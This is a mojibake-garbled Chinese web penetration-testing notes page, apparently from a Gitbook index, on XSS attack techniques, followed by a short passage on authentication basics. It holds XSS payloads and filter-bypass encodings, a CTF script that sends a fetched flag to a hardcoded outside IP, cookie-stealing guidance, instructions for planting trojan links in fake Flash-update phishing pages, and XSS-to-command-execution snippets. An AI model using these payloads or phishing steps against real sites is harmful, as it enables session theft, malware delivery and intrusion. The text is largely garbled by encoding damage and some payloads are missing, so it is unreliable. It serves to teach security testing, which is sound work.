æˆ‘ä»¬å¯ä»¥é€‰æ‹©ç›´æ¥é—­åˆæ ‡ç­¾ï¼š \"> // è¾“å‡ºåå¦‚ä¸‹: \" type=text> å¦‚æœ è¢«è¿‡æ»¤çš„è¯å¯ä»¥æ¢æˆé€‰æ‹©ä½¿ç”¨äº‹ä»¶æ¥é—­åˆå±æ€§ï¼Œå¹¶å°†åé¢çš„å¼•å·æ³¨é‡Šæ‰æˆ–é—­åˆï¼š \" autofocus onfocus=alert(1)// \" autofocus onfocus=alert(1) \" // è¾“å‡ºåå¦‚ä¸‹: è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„åœºæ™¯ï¼Œå¦‚ï¼š è¿™é‡Œåªèƒ½æŠŠinputæ ‡ç­¾é—­åˆï¼Œç„¶åç›´æ¥æ‰§è¡Œè„šæœ¬ï¼Œå¦åˆ™ä¼šå› ä¸ºtypeä¸ºhiddenå¯¼è‡´æ— æ³•æ‰§è¡Œè„šæœ¬ã€‚ è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´ ä¾‹å¦‚è¾“å‡ºçš„ä½ç½®å¦‚ä¸‹ï¼š [è¾“å‡º] ç›´æ¥æäº¤ alert(1) å³å¯è§¦å‘XSSï¼Œä½†æ˜¯å½“æ ‡ç­¾æ˜¯ä¸èƒ½æ‰§è¡Œè„šæœ¬çš„æ ‡ç­¾æ—¶ï¼Œå¦‚ä¸‹é¢è¿™å‡ ä¸ªï¼š é‚£ä¹ˆå°±å¾—å…ˆæŠŠé‚£ä¸ªæ ‡ç­¾é—­åˆï¼Œç„¶ååœ¨æ³¨å…¥XSSè¯­å¥ï¼Œä¾‹å¦‚ï¼š alert(1) è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´ ä¾‹å¦‚ï¼š var x = \"input\"; å¯æ§ä½ç½®åœ¨inputï¼Œå¯ä»¥é—­åˆscriptæ ‡ç­¾æ’å…¥ä»£ç ï¼Œä½†æ˜¯åŒæ ·æˆ‘ä»¬ä»…ä»…é—­åˆåŒå¼•å·å°±å¯ä»¥æ‰§è¡Œjsä»£ç äº†ï¼š \";alert(1)// // è¾“å‡ºåå¦‚ä¸‹: var x = \"\";alert(1)//\"; 02.å°è¯•æ’å…¥æ¯”è¾ƒæ­£å¸¸çš„HTMLæ ‡ç­¾ ä¾‹å¦‚ï¼šã€ã€ã€ ç­‰ï¼Œæ¥çœ‹ä¸€ä¸‹è¿”å›é¡µé¢çš„æƒ…å†µæ˜¯æ€æ ·çš„ï¼Œæ˜¯å¦è¢«HTMLç¼–ç äº†ï¼Œæˆ–è€…æ ‡ç­¾è¢«è¿‡æ»¤äº†ã€‚ 03.å°è¯•æ’å…¥ä¸é—­åˆçš„æ ‡ç­¾ ä¾‹å¦‚ï¼šã€ã€i>ã€u>ã€ ç­‰ï¼Œç„¶åçœ‹ä¸€ä¸‹è¿”å›å“åº”ï¼Œæ˜¯å¦å¯¹å¼€æ”¾çš„æ ‡ç­¾ä¹Ÿæœ‰è¿‡æ»¤ã€‚ 04.æµ‹è¯•å¸¸è§çš„XSSå‘é‡ è§‚å¯Ÿæ ‡ç­¾ï¼Œäº‹ä»¶ï¼Œåè®®ç­‰æ˜¯å¦æœ‰æ¼ç½‘ä¹‹é±¼ self xssæå‡å±å®³ åˆ†äº«åŠŸèƒ½ï¼Œå…¶ä»–äººæŸ¥çœ‹æ—¶è§¦å‘ ç»•è¿‡httponly Apache httpOnly Cookieæ³„éœ²( CVE-2012-0053) å½±å“ç‰ˆæœ¬ï¼šApache2.2.0-Apache2.2.1 å½“å®¢æˆ·ç«¯è¯·æ±‚çš„cookieè¶…è¿‡4KBæ—¶ï¼Œæ— è®ºcookieæ˜¯å¦å¸¦æœ‰httponlyï¼ŒApache HTTPD Serveréƒ½ä¼šå°†Cookieçš„æ˜æ–‡ä¿¡æ¯æ‰“å°åˆ°é¡µé¢ä¸Š CORS+cookieå›æ˜¾ ä¾‹é¢˜ https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss æ¡ä»¶1 responseæ•°æ®åŒ…ä¸­ Access-Control-Allow-Headers: X-Requested-Withï¼Œè¯´æ˜äº†æˆ‘ä»¬å¯ä»¥é€šè¿‡XHRè¯·æ±‚æ¥è®¿é—®ç½‘ç«™ XMLHttpRequestæ˜¯ç”¨äºåœ¨åå°ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®ã€‚å¦‚æœè®¾ç½®XHRè¯·æ±‚ç½‘ç«™ï¼Œé‚£ä¹ˆè¯·å¤´éƒ¨å¿…ç„¶ä¼šå¸¦æœ‰ï¼šOrigin:xxxï¼Œåˆ™ä¼šè¢«æœåŠ¡å™¨è§†ä¸ºåŒæºè®¿é—® æ¡ä»¶2 æ²¡æœ‰å…³é—­debugæ¨¡å¼ï¼Œå¯¼è‡´cookieå›æ˜¾ åˆ©ç”¨location.hrefé‡å®šå‘åˆ°vpsï¼Œä»è€Œå¸¦å‡ºcookie var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState==4){ location.href='http://106.15.250.162:8888/?flag='+ xmlhttp.responseText.match('flag\\\\{(.\\*?)\\\\}')[1]}}; } } xmlhttp.open('GET','/index.php/treehole/view?id=',true); xmlhttp.send(''); CST--traceè¯·æ±‚ TRACE æ–¹æ³•ä¼šè¿”å›åŸå§‹è¯·æ±‚æŠ¥æ–‡ï¼Œå…¶ä¸­å°±åŒ…å«äº†cookie https://www.cnblogs.com/gaopei/p/11380349.html debugä¿¡æ¯æ³„æ¼ æ¯”å¦‚phpinfoï¼Œthinkphpæ¡†æ¶debugä¿¡æ¯ç­‰ æ”»å‡»é¢æ‹“å±• é’“é±¼ é€šè¿‡ XSS ç›—å– Cookie Cookieç›—å–æ˜¯xssæ”»å‡»ä¸­æœ€å®ç”¨ä¹Ÿæ˜¯æœ€å¹¿æ³›çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚æˆ‘ä»¬çŸ¥é“Cookieæ˜¯Webç³»ç»Ÿè¯†åˆ«ç”¨æˆ·çš„èº«ä»½å’Œä¿å­˜ä¼šè¯çŠ¶æ€çš„ä¸»è¦æœºåˆ¶ï¼Œä¸”æ˜¯ç”±æœåŠ¡å™¨æä¾›çš„ã€å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„ä¸€ç§æ•°æ®ã€‚åŒæ—¶ï¼Œå¯¹äºcookieçš„æ“ä½œååˆ†çš„æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Documentå¯¹è±¡è®¿é—®Cookieã€‚æœ€ç®€å•çš„æ¯”å¦‚ï¼šalert(document.cookie) ï¼Œæ‰§è¡Œåä¼šå¼¹å‡ºå½“å‰é¡µé¢çš„cookieä¿¡æ¯ã€‚åœ¨ç›®æ ‡æ²¡æœ‰â€œåŒæºç­–ç•¥â€çš„ä¿æŠ¤ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨XSSç›—å–ç›®æ ‡ç½‘ç«™ç®¡ç†å‘˜çš„Cookieã€‚ åœ¨ä¸€èˆ¬çš„é€šç”¨CMSä¸‹å‘¢ï¼Œä¸ºäº†é€šç”¨æ¨¡æ¿çš„å…¼å®¹æ€§ï¼Œè®¸å¤šCMSæœ¬èº«ä¸ä¼šä½¿ç”¨â€œåŒæºç­–ç•¥â€ç­‰å…¶ä»–æ‰‹æ®µæ¥é˜²æŠ¤XSSæ¼æ´ï¼Œè€Œæ˜¯ä½¿ç”¨è‡ªå»ºçš„è¿‡æ»¤å‡½æ•°æ¥å¤„ç†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€æ—¦å‡ºç°XSSæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è·å–ç›®æ ‡çš„Cookieç„¶åä½¿ç”¨ç‰¹å®šçš„æ–¹æ³•æ¥ä¼ è¾“cookieã€‚ è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç½‘ä¸Šç°æˆçš„æˆ–è‡ªå·±æ­å»ºçš„XSSå¹³å°æ¥å®Œæˆåˆ©ç”¨è¿‡ç¨‹ã€‚ Flash å¼¹çª—é’“é±¼ é¡¹ç›®ä¸€åœ°å€ï¼šhttps://github.com/Wileysec/adobe-flash-phishing-page è¯¥é¡¹ç›®æ˜¯æ¨¡ä»¿çš„ Flash Player ä¸­æ–‡å®˜ç½‘çš„é¡µé¢ï¼š éœ€è¦åœ¨index.htmlä¸­çš„åŠ å…¥æˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬çš„é“¾æ¥åœ°å€ï¼š é¡¹ç›®äºŒåœ°å€ï¼šhttps://github.com/r00tSe7en/Flash-Pop è¯¥é¡¹ç›®æ˜¯ä¸€ä¸ªé€¼çœŸçš„Flashæ›´æ–°æé†’çš„å¼¹çª—ï¼Œå¼ºè¿«ç—‡éƒ½ä¼šå¿ä¸ä½å»ç‚¹å‡»ä¸‹è½½çš„ï¼š æ‰¾åˆ°flash.jsï¼Œæœç´¢é“¾æ¥â€œhttps://www.se7ensec.cn/â€ï¼Œå°†å…¶æ”¹ä¸ºæˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬çš„é“¾æ¥åœ°å€ï¼Œç„¶åä¿å­˜å³å¯ï¼š RCE ä¸ºäº†å¤§å¤§æå‡ XSS çš„å±å®³ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ JavaScript æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ä½¿ç”¨ WScript.Shell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ æ¡ä»¶ Internet Explorer åœ¨IEä¸Šæ‰“å¼€è®¾ç½®ä¸­çš„Intertneté€‰é¡¹-â€œå®‰å…¨â€-â€œè‡ªå®šä¹‰çº§åˆ«â€-â€œå¯¹æ²¡æœ‰æ ‡è®°ä¸ºå®‰å…¨çš„activexæ§ä»¶è¿›è¡Œåˆå§‹åŒ–å’Œè„šæœ¬è¿è¡Œ-è®¾ç½®æˆå¯ç”¨ï¼Œå¦‚ä¸‹ WScript.Shellï¼ˆWindows Script Host Runtime Libraryï¼‰æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹åº”çš„æ–‡ä»¶æ˜¯C:/WINDOWS/system32/wshom.ocxï¼ŒWscript.shellæ˜¯æœåŠ¡å™¨ç³»ç»Ÿä¼šç”¨åˆ°çš„ä¸€ç§ç»„ä»¶ã€‚4è¿™ä¸ªå¯¹è±¡å¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå¤–å£³å¸¸ç”¨çš„æ“ä½œï¼Œæ¯”å¦‚è¿è¡Œç¨‹åºã€è¯»å†™æ³¨å†Œè¡¨ã€ç¯å¢ƒå˜é‡ç­‰ã€‚ç®€å•ä½¿ç”¨å¦‚ä¸‹ï¼š var shell = new ActiveXObject(\"WScript.Shell\"); shell.run(\"calc.exe\"); æœ‰æ—¶å€™ä¸ºäº† Bypass ä¹Ÿå¯ä»¥ä½¿ç”¨ String.fromCharCode ä» Ascii æ¥è½¬åŒ–æ¶æ„ä»£ç ï¼š ä½¿ç”¨ child_process æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ å¦‚æœç›®æ ‡ç¯å¢ƒå¯ç”¨äº† NodeJS çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨ NodeJS çš„å­è¿›ç¨‹ï¼ˆchild_processï¼‰è°ƒç”¨å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š ');\"> èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œé‚£ä¹ˆ XSS åœ¨é’“é±¼æ”»å‡»ä¸­çš„ä½œç”¨ä¾¿å¤§å¤§æé«˜äº†ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨ XSS åå¼¹ Shell å¹¶ä¸Šçº¿ Metasploit æˆ– CS ã€‚ Xmind 2020 XSS to RCE æ¼æ´åˆ©ç”¨å¾ˆç®€å•ï¼Œåœ¨ â€œæ€ç»´å¯¼å›¾â€ ä¸­è¾“å‡º Payloadï¼š åˆ‡æ¢åˆ° â€œå¤§çº²â€ ä¸­ï¼ŒæŒ‰ä¸‹ä¸€ä¸ªåŠŸèƒ½é”®å³å¯è§¦å‘æ”»å‡»ï¼š ç”±äº Xmind å¯ç”¨äº† NodeJS åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ child_process è°ƒç”¨å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ èšå‰‘çš„XSS to RCE https://github.com/AntSwordProject/antSword/issues/147 æµ…è°ˆèšå‰‘RCE - å…ˆçŸ¥ç¤¾åŒº Bypass ç»•è¿‡ç©ºæ ¼ å½“ç©ºæ ¼è¢«è¿‡æ»¤äº†æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ / æ¥ä»£æ›¿ç©ºæ ¼ï¼š ä¹Ÿå¯ä»¥ï¼š ç»•è¿‡å¼•å· alert(/xss/) alert(`xss`) ç»•è¿‡æ‹¬å· throw test åå¼•å· alert(1) == alert`1` ç»•è¿‡å…³é”®å­—è¿‡æ»¤ å¤§å°å†™ç»•è¿‡ alert(1); åŒå†™ç»•è¿‡ æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡ ipt> alert(\"xss\") ipt> alert(1); å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ åˆ©ç”¨eval()å‡½æ•° ä¸PHPçš„eval()å‡½æ•°ç›¸åŒï¼ŒJavaScriptçš„eval()å‡½æ•°ä¹Ÿå¯ä»¥è®¡ç®— JavaScript å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œã€‚ // åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å· åˆ©ç”¨top top[\"al\"+\"ert\"](`xss`); top[\"al\"+\"ert\"](\"xss\"); å­—ç¬¦ç¼–ç ç»•è¿‡ HTML å®ä½“ç¼–ç  HTML ç¼–ç ä¸»è¦åˆ†ä¸º10è¿›åˆ¶å’Œ16è¿›åˆ¶ï¼Œæ ¼å¼ä¸ºä»¥ &# å¼€å¤´ä»¥åˆ†å· ; ç»“å°¾ï¼ˆä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·ï¼‰ã€‚ test // åè¿›åˆ¶ test // åå…­è¿›åˆ¶ test // ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å· test // åè¿›åˆ¶ // åå…­è¿›åˆ¶ // ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å· URLç¼–ç  æˆ‘ä»¬å¯ä»¥å¹¶å°†srcæˆ–hrefå±æ€§ä¸­çš„å†…å®¹è¿›è¡ŒURLç¼–ç ï¼Œå½“HTMLè§£æå™¨å¯¹srcæˆ–hrefä¸­çš„å­—ç¬¦å®ŒæˆHTMLè§£ç åï¼Œæ¥ä¸‹æ¥URLè§£æå™¨ä¼šå¯¹srcæˆ–hrefä¸­çš„å€¼è¿›è¡ŒURLè§£ç ã€‚ xx ä¸‹é¢ç»™å‡ºå‡ ä¸ªå®ä¾‹ã€‚ test test æ³¨æ„ï¼Œä¼ªåè®®å¤´ javascript: æ˜¯ä¸èƒ½è¿›è¡Œç¼–ç çš„ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªURLè§£æè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªç»†èŠ‚äº†ï¼Œå³ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œå¦åˆ™URLè§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´DOMèŠ‚ç‚¹ä¸­è¢«ç¼–ç çš„â€œjavascriptâ€æ²¡æœ‰è¢«è§£ç ï¼Œå½“ç„¶ä¸ä¼šè¢«URLè§£æå™¨è¯†åˆ«äº†ã€‚å°±æ¯”å¦‚è¯´ http://www.baidu.com å¯ä»¥è¢«URLç¼–ç ä¸º http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6dï¼Œä½†æ˜¯ä¸èƒ½æŠŠåè®®ä¹Ÿè¿›URLç¼–ç ï¼š%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d ã€‚ ä½†æ˜¯ä¼ªåè®®å¤´ javascript: å¯ä»¥è¿›è¡ŒHTMLç¼–ç ã€‚ Javascript ç¼–ç  æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸º Javascript ç¼–ç ã€‚å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ ã€ è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ srcã€ href åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚ Javascript ä¸­å¯ä»¥è¯†åˆ«çš„ç¼–ç ç±»å‹æœ‰ï¼š Unicode ç¼–ç  å…«è¿›åˆ¶ç¼–ç  åå…­è¿›åˆ¶ç¼–ç  ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä½¿ç”¨Unicodeç¼–ç çš„æ¯”è¾ƒå¹¿æ³›ï¼Œè€Œå…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶åªæœ‰åœ¨DOMç¯å¢ƒæˆ–eval()ç­‰å‡½æ•°ä¸­æ‰å¯ä»¥ç”¨ã€‚ Unicode ç¼–ç  alert(\"xss\") \\u0061\\u006C\\u0065\\u0072\\u0074(\"xss\") \\u0061\\u006C\\u0065\\u0072\\u0074(\"\\u0078\\u0073\\u0073\") test test test ä½†è¦æ³¨æ„ï¼Œæˆ‘ä»¬åŒæ ·ä¹Ÿä¸èƒ½å¯¹ä¼ªåè®®å¤´ javascript: è¿›è¡Œ Javascript ç¼–ç ã€‚å¹¶ä¸”åƒåœ†æ‹¬å·ã€åŒå¼•å·ã€å•å¼•å·è¿™æ ·çš„ç¬¦å·æˆ‘ä»¬ä¹Ÿä¸èƒ½è¿› Javascript ç¼–ç ï¼Œä½†æ˜¯èƒ½è¿›è¡ŒHTMLç¼–ç ã€‚ åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç  å¯¹äºå…«è¿›åˆ¶ç¼–ç å’Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä¸ Unicode ç¼–ç è¿˜æ˜¯æœ‰åŒºåˆ«ï¼Œåƒä¸‹é¢çš„XSSå‘é‡æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œçš„ï¼š alert(\"xss\") \\141\\154\\145\\162\\164(\"xss\") test test å¦‚ä¸‹å›¾ï¼Œæ’å…¥ä¹‹åæ²¡æœ‰ä»»ä½•ååº”ï¼š è¦æƒ³è®©ä»–ä»¬èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬è¦å°†ä»–ä»¬æ”¾åœ¨DOMç¯å¢ƒä¸­ï¼Œå³DOMå‹çš„XSSã€‚ æµ‹è¯•ä»£ç ï¼š test var search = \"...\"; document.getElementById('s').innerHTML = search; ä»¥ä¸Šæƒ…å†µå¾ˆå¤šéƒ½æ˜¯å‡ºç°åœ¨ä½ æœç´¢åï¼Œæ˜¾ç¤ºä½ æ‰€æŸ¥è¯¢çš„å…³é”®å­—ï¼Œå˜é‡ search æ˜¯ä¸€ä¸ªå¯æ§ç‚¹ï¼Œå½“æˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸ªXSSæ”»å‡»å‘é‡åï¼Œå˜é‡ search å°±ä¼šè¢«èµ‹å€¼ä¸ºè¿™ä¸ªXSSå‘é‡ï¼Œä»è€Œæ’å…¥åˆ°divæ ‡ç­¾ä¸­è§¦å‘XSSï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š test var search = \"\"; document.getElementById('s').innerHTML = search; æ­¤æ—¶å¦‚æœè¿‡æ»¤äº† ã€>ã€'ã€\"ã€&ã€% ç­‰ç­‰è¿™äº›å­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç”¨JavaScriptç¼–ç çš„æ–¹æ³•å°†XSSå‘é‡å…¨éƒ¨ç¼–ç ï¼Œå³ çš„ä»¥ä¸‹ç¼–ç éƒ½å¯ä»¥å¼¹çª—ï¼š // Unicodeç¼–ç  \\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E // å…«è¿›åˆ¶ç¼–ç  \\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76 // åå…­è¿›åˆ¶ç¼–ç  \\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e è¿˜æœ‰ä¸€ç§è®©å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶ç¼–ç çš„XSSæ”»å‡»å‘é‡æ‰§è¡Œçš„æ–¹å¼ä¾¿æ˜¯å°†XSSå‘é‡æ”¾åœ¨æŸä¸ªèƒ½æŠŠå­—ç¬¦ä¸²å½“åšJavaScriptä»£ç æ¥æ‰§è¡Œçš„å‡½æ•°é‡Œï¼Œæ¯”å¦‚eval()ã€setTimeout()ã€setInterval()ç­‰å‡½æ•°ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼š alert(\"xss\") eval(\"\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51\") test test æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥å°†ä¸€æ•´æ®µjsä»£ç ç¼–ç åæ”¾å…¥eval()å‡½æ•°ä¸­æ‰§è¡Œã€‚ æ··åˆç¼–ç  æ··åˆç¼–ç å°±æ˜¯å¯¹ä¸€ä¸ªXSSå‘é‡åŒæ—¶è¿›è¡Œå¤šç§ç¼–ç ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š test // å¯¹javascript:è¿›è¡ŒHTMLç¼–ç , å¯¹alert(\"xss\")è¿›è¡ŒURLç¼–ç  test // å¯¹javascript:è¿›è¡ŒHTMLç¼–ç , å¯¹alertè¿›è¡ŒUnicodeç¼–ç  test ä¹Ÿå¯ä»¥åˆ©ç”¨è§£ç é¡ºåºè¿›è¡Œæ··åˆç¼–ç ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š test é¦–å…ˆå¯¹â€œalertâ€è¿›è¡ŒJavaScript Unicodeç¼–ç ï¼š test ç„¶åå†å¯¹ \\u0061\\u006c\\u0065\\u0072\\u0074 è¿›è¡ŒURLç¼–ç ï¼š test æœ€åå¯¹æ ‡ç­¾ä¸­çš„ javascript:%5c%75...%37%34(\"xss\") æ•´ä½“è¿›è¡ŒHTMLç¼–ç å³å¯ï¼š test SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³• æ ‡ç­¾+htmlå®ä½“ç¼–ç  &#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41; alert&#40;1) alert&#40;1&#41; Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 22:30:22 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/00.å‰ç½®çŸ¥è¯†.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/00.å‰ç½®çŸ¥è¯†.html","title":"00.å‰ç½®çŸ¥è¯†","keywords":"","body":"è®¿é—®æ§åˆ¶ ç”¨æˆ·è®¿é—®æ¥å£â†’ç”¨æˆ·æ˜¯å¦åˆæ³•ï¼ˆè®¤è¯ï¼‰â†’ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰æƒé™ï¼ˆæˆæƒï¼šæƒé™æ§åˆ¶å’Œè§’è‰²æ§åˆ¶ï¼‰â†’ æ¥å£è¿”å›æ•°æ® è®¤è¯ è®¤è¯å°±æ˜¯åˆ¤æ–­ä½ è¿™ä¸ªç”¨æˆ·æ˜¯ä¸æ˜¯åˆæ³•ç”¨æˆ·ï¼Œä»–æ˜¯ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªè®¤è¯çš„è¿‡ç¨‹ã€‚ ç”¨æˆ·åå’Œå¯†ç ï¼šæœ€å¸¸è§çš„è®¤è¯æ–¹å¼ï¼Œç”¨æˆ·é€šè¿‡è¾“å…¥æ³¨å†Œæ—¶è®¾ç½®çš„ç”¨æˆ·åå’Œå¯†ç æ¥è¯æ˜èº«ä»½ã€‚ åŒå› ç´ è®¤è¯ï¼ˆ2FAï¼‰ï¼šåœ¨ç”¨æˆ·åå’Œå¯†ç çš„åŸºç¡€ä¸Šï¼Œè¿˜è¦æ±‚è¾“å…¥ç¬¬äºŒç§éªŒè¯æ–¹å¼ï¼Œå¦‚æ‰‹æœºçŸ­ä¿¡éªŒè¯ç æˆ–ç¡¬ä»¶ä»¤ç‰Œã€‚ ç”Ÿç‰©è¯†åˆ«ï¼šå¦‚æŒ‡çº¹è¯†åˆ«ã€é¢éƒ¨è¯†åˆ«ã€è™¹è†œè¯†åˆ«ç­‰ã€‚ OAuthã€OpenIDç­‰ç¬¬ä¸‰æ–¹è®¤è¯ï¼šç”¨æˆ·é€šè¿‡ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆå¦‚Googleã€Facebookï¼‰ç™»å½•ã€‚ æˆæƒ æˆæƒå…¶å®å°±æ˜¯ä½ è®¤è¯æˆåŠŸä¹‹åï¼Œä½ çš„æƒé™èƒ½è®¿é—®ç³»ç»Ÿçš„é‚£äº›èµ„æºï¼Œå½“æˆ‘ä»¬èº«ä»½è®¤è¯é€šè¿‡åéœ€è¦åˆ†é…æƒé™å†³å®šä½ å¯ä»¥è®¿é—®é‚£äº›èµ„æºã€‚ æƒé™æ§åˆ¶ æƒé™æ§åˆ¶æ˜¯ä¸€ç§åŸºäºç”¨æˆ·å…·æœ‰ç‰¹å®šæƒé™æ¥é™åˆ¶å…¶å¯¹ç³»ç»Ÿèµ„æºè®¿é—®çš„æœºåˆ¶ã€‚ æ¯ä¸ªç”¨æˆ·è¢«åˆ†é…äº†ä¸€ç»„æƒé™ï¼Œè¿™äº›æƒé™å®šä¹‰äº†ä»–ä»¬å¯ä»¥æ‰§è¡Œçš„æ“ä½œã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ªç”¨æˆ·å¯èƒ½è¢«æˆäºˆè¯»å–ã€å†™å…¥æˆ–åˆ é™¤æ–‡ä»¶çš„æƒé™ã€‚å½“ç”¨æˆ·å°è¯•è®¿é—®æŸä¸ªèµ„æºæ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥å…¶æ˜¯å¦å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œè¯¥æ“ä½œã€‚å¦‚æœç”¨æˆ·æ²¡æœ‰æ‰€éœ€çš„æƒé™ï¼Œåˆ™è®¿é—®å°†è¢«æ‹’ç»ã€‚ è§’è‰²æ§åˆ¶ è§’è‰²æ§åˆ¶æ˜¯ä¸€ç§åŸºäºç”¨æˆ·å…·æœ‰ç‰¹å®šè§’è‰²æ¥é™åˆ¶å…¶å¯¹ç³»ç»Ÿèµ„æºè®¿é—®çš„æœºåˆ¶ã€‚ æ¯ä¸ªè§’è‰²åŒ…å«äº†ä¸€ç»„æƒé™ï¼Œè€Œç”¨æˆ·åˆ™è¢«åˆ†é…åˆ°ä¸åŒçš„è§’è‰²ä¸­ã€‚é€šè¿‡å°†ç”¨æˆ·ä¸è§’è‰²ç›¸å…³è”ï¼Œå¯ä»¥çµæ´»åœ°ç®¡ç†ç”¨æˆ·çš„æƒé™ã€‚ 